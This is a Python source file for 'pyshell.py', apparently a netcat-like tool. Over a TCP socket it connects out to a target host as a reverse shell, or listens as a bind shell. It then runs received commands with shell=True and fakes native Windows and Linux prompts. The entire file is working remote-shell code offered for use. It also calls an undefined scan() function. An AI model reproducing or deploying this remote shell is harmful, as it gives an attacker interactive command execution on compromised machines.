#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import os

listen = False
execute = ''
target = ""
port = 0


def usage():

    print("Usage: pyshell.py -t target_host -p port")

    print("-h --help")
    print("Display this help message")

    print("-l --listen")
    print("Listen on [host]:[port] for incoming connections")

    print("-p --port")
    print("Port for the connections")

    print("-e --execute=file_to_run")
    print("Execute file upon connection")

    print("-t --target=host")
    print("Host for the ibound connection")

    sys.exit(0)


def exec_command(command, exe):
    command = command.rstrip()

    try:
        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash':
            out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)+'\n'.encode()
        else:
            out = subprocess.check_output([exe, command], stderr=subprocess.STDOUT, shell=True)+'\n'.encode()

    except subprocess.CalledProcessError:
        out = b"'%s' command not found \n\n" % command.encode()
    return out


def client_handler(client_socket, execute):
    if len(execute):
        if sys.platform == 'win32':
            ver = subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True) + b'(c) Microsoft Corporation. All rights reserved.\n\n'
            client_socket.send(ver + os.getcwd().encode() + b'>')
        else:
            loc = os.getcwd().split('/')
            if loc[1] == 'root':
                usr = 'root'
            else:
                usr = loc[2]
                client_socket.send(('%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())

        while 1:
            try:
                cmd_buffer = client_socket.recv(1024)

                _str = cmd_buffer.decode()
                if not len(_str):
                    out = b'\n'

                elif _str[:4] == 'exit':
                    client_socket.send(b'^exit^3760d35305a9d5a7e738adaf37b2d129$exit$')
                    client_socket.close()
                    break

                else:
                    if _str[:2] == 'cd' and len(_str) != 2:
                        try:
                            os.chdir(_str[3:])
                            out = b'\n'
                        except:
                            out = b"'%s' cannot find such file or directory\n\n"
                    elif _str[:2] == 'cd' and sys.platform != 'win32':
                        oloc = ''
                        aloc = os.getcwd().split('/')
                        i = 0
                        while i < 3:
                            oloc += aloc[i]+'/'
                            i += 1
                        os.chdir(oloc)
                        out = b'\n'
                    else:
                        out = exec_command(_str, execute)

                if sys.platform == 'win32':
                    client_socket.sendall(out + os.getcwd().encode() + b'>')

                else:
                    loc = os.getcwd().split('/')
                    if loc[1] == 'root':
                        usr = 'root'
                    else:
                        usr = loc[2]
                    client_socket.sendall(out + ('%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())

            except:
                client_socket.close()
                break


    else:
        while 1:
            try:
                data = client_socket.recv(4096).decode()
                if data == '^exit^3760d35305a9d5a7e738adaf37b2d129$exit$':
                    print('exit')
                    client_socket.close()
                    break

                buffer = input(data)
                if not len(buffer):
                    buffer = '\n'
                client_socket.send(buffer.encode())

            except:
                client_socket.close()
                break

    quit()


def client_send(target, port, exe):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))

        print('(UNKNOWN) [%s] %s : connection successfully' % (target, port))

        try:
            client_thread = threading.Thread(target=client_handler, args=(client, exe))
            client_thread.start()
        except KeyboardInterrupt:
            print('^C')
            quit()

    except:
        print('(UNKNOWN) [%s] %s : connection failed' % (target, port))

def server_loop(port, up, target, exe):
    if not len(target):
        target = "0.0.0.0"

    print('Listening on %s ...' % port)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    try:
        client_socket, addr = server.accept()

        print('(UNKNOWN) [%s] %s : connection successfully' % (addr[0], addr[1]))

        try:
            client_thread = threading.Thread(target=client_handler, args=(client_socket, exe))
            client_thread.start()

        except KeyboardInterrupt:
            print('^C')
            quit()

    except:
        pass


def main():
    global listen
    global port
    global execute
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        scan()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", [
                                   "help", "listen", "execute", "target", "port"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            pass

    if not listen and len(target) and port > 0:
        client_send(target, port, execute)

    if listen:
        server_loop(port, execute, target, execute)

main()
